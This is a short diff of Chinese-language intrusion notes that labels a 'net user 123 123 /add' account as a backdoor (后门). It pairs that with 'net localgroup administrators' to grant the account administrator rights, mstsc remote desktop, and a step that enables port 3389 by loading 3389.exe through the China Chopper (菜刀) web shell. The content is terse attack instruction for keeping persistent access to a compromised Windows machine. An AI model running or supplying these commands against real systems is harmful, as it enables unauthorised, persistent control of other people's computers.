@@ -1,4 +1,4 @@
-增加用户:net user 123 123 /add
+增加用户:net user 123 123 /add (后门)
 提权 net localgroup administrators 123/add
   (1)远程连接:mstsc
   (2)远程连接没开启时,开启远程连接菜刀里放 3389.exe
